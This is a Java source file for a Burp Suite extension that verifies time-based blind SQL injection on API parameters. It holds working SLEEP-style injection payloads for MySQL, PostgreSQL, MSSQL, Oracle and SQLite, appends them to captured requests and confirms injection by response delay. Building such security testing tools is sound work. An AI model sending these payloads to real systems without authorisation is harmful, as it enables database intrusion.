package com.flechazo.apisentinel.detection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.flechazo.apisentinel.logging.LeveledLogger;
import com.flechazo.apisentinel.model.ApiEntry;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Timing-based blind SQL injection verifier: sends DB-specific SLEEP payloads
 * and confirms when the response is delayed past the threshold. Programmatic
 * verdict (no LLM). Guards: baseline slower than 2s → skip (unreliable
 * network); 5xx probe responses never count (server slowness ≠ injection).
 *
 * Sleep functions per DB distilled from bughunter's blind-SQLi reference
 * (MIT — see docs/THIRD-PARTY.md).
 */
public class TimingBlindVerifier {

    /** Expected sleep (ms) injected by the payload. */
    public static final long SLEEP_MS = 5000;
    /** Delay at/above which the probe counts as confirmed (90% of SLEEP_MS). */
    public static final long THRESHOLD_MS = 4500;
    /** Baseline slower than this → timing test unreliable, skip. */
    public static final long MAX_RELIABLE_BASELINE_MS = 2000;

    /** DB → payload suffix appended to the original parameter value. */
    public static final Map<String, String> SLEEP_PAYLOADS = new LinkedHashMap<>();
    static {
        SLEEP_PAYLOADS.put("mysql", " AND SLEEP(5)");
        SLEEP_PAYLOADS.put("postgresql", "; SELECT pg_sleep(5)");
        SLEEP_PAYLOADS.put("mssql", "'; WAITFOR DELAY '0:0:5'--");
        SLEEP_PAYLOADS.put("oracle", " AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)");
        SLEEP_PAYLOADS.put("sqlite",
                " AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))");
    }

    private final MontoyaApi api;
    private final LeveledLogger logger;

    public TimingBlindVerifier(MontoyaApi api, LeveledLogger logger) {
        this.api = api;
        this.logger = logger;
    }

    /**
     * Verify timing blind SQLi on one parameter.
     *
     * @param dbType "mysql"/"postgresql"/"mssql"/"oracle"/"sqlite" or
     *               "auto"/null to try every DB in order until one confirms.
     */
    public BlindVerificationResult verify(ApiEntry entry, String paramName,
                                          String paramLocation, String paramValue,
                                          String dbType) {
        String raw = entry.getLastRawRequest();
        if (raw == null || raw.isEmpty()) {
            return BlindVerificationResult.notConfirmed("timing_blind", "无捕获请求，无法验证");
        }

        // Baseline timing with the untouched request.
        Timed baseline = send(entry, raw);
        if (baseline == null) {
            return BlindVerificationResult.notConfirmed("timing_blind", "基线请求失败");
        }
        if (baseline.elapsed > MAX_RELIABLE_BASELINE_MS) {
            return BlindVerificationResult.notConfirmed("timing_blind",
                    "基线响应 " + baseline.elapsed + "ms > " + MAX_RELIABLE_BASELINE_MS
                  + "ms，网络太慢时序判定不可靠，已跳过");
        }

        boolean auto = dbType == null || dbType.isBlank() || "auto".equalsIgnoreCase(dbType);
        String[] dbs = auto
                ? SLEEP_PAYLOADS.keySet().toArray(new String[0])
                : new String[]{dbType.toLowerCase()};

        for (String db : dbs) {
            String suffix = SLEEP_PAYLOADS.get(db);
            if (suffix == null) continue;
            String base = paramValue == null ? "" : paramValue;
            String mutated = BlindParamMutator.mutate(raw, paramName, paramLocation, base + suffix);
            if (mutated == null) {
                return BlindVerificationResult.notConfirmed("timing_blind",
                        "无法在 " + paramLocation + " 定位参数 " + paramName);
            }
            Timed probe = send(entry, mutated);
            if (probe == null) continue;

            String detail = classifyTiming(baseline.elapsed, probe.elapsed, probe.status, SLEEP_MS);
            if (detail != null) {
                // Confirmation round: re-send baseline to rule out network jitter
                Timed recheck = send(entry, raw);
                if (recheck != null && recheck.elapsed >= THRESHOLD_MS) {
                    if (logger != null) {
                        logger.info("[TimingBlind] %s 参数 %s 二次基线也慢 (%dms)，网络抖动误判，跳过 %s",
                                entry.getApiPath(), paramName, recheck.elapsed, db);
                    }
                    continue;
                }
                if (logger != null) {
                    logger.info("[TimingBlind] %s 参数 %s 确认时序盲注 (%s): %s",
                            entry.getApiPath(), paramName, db, detail);
                }
                // [payload: ...] — same rationale as BooleanBlindVerifier: the
                // detail lands in PayloadResult.testCase().payload() and must
                // carry the actual payload text for VerdictValidator matching.
                return new BlindVerificationResult(true, "timing_blind",
                        detail + "（DB: " + db + "）[payload: " + base + suffix + "]", false, db,
                        probe.rawRequest, probe.rawResponse, probe.status, probe.elapsed);
            }
        }
        return BlindVerificationResult.notConfirmed("timing_blind",
                "所有 DB SLEEP 探针响应延迟均低于 " + THRESHOLD_MS + "ms（基线 " + baseline.elapsed + "ms）");
    }

    /** Pure classifier: confirmation detail, or null when not confirmed.
     *  5xx probe responses never count (server slowness ≠ injection). */
    public static String classifyTiming(long baselineMs, long probeMs, int probeStatus, long sleepMs) {
        if (probeStatus >= 500 || probeStatus == 0) return null;
        long threshold = Math.max((long) (sleepMs * 0.9), THRESHOLD_MS);
        if (probeMs >= threshold && probeMs - baselineMs >= threshold - MAX_RELIABLE_BASELINE_MS) {
            return "SLEEP 探针响应延迟 " + probeMs + "ms（基线 " + baselineMs + "ms，阈值 " + threshold + "ms）";
        }
        return null;
    }

    private static final class Timed {
        final String rawRequest;
        final String rawResponse;
        final int status;
        final long elapsed;

        Timed(String rawRequest, String rawResponse, int status, long elapsed) {
            this.rawRequest = rawRequest;
            this.rawResponse = rawResponse;
            this.status = status;
            this.elapsed = elapsed;
        }
    }

    private Timed send(ApiEntry entry, String rawRequest) {
        try {
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(HttpRequest.httpRequest(
                    ActiveProbeExecutor.resolveService(entry), rawRequest));
            long elapsed = System.currentTimeMillis() - start;
            int status = rr.response() != null ? rr.response().statusCode() : 0;
            String rawResp = rr.response() != null ? rr.response().toString() : "";
            return new Timed(rawRequest, rawResp, status, elapsed);
        } catch (Exception e) {
            if (logger != null) logger.warn("[TimingBlind] 请求失败: %s", e.getMessage());
            return null;
        }
    }
}
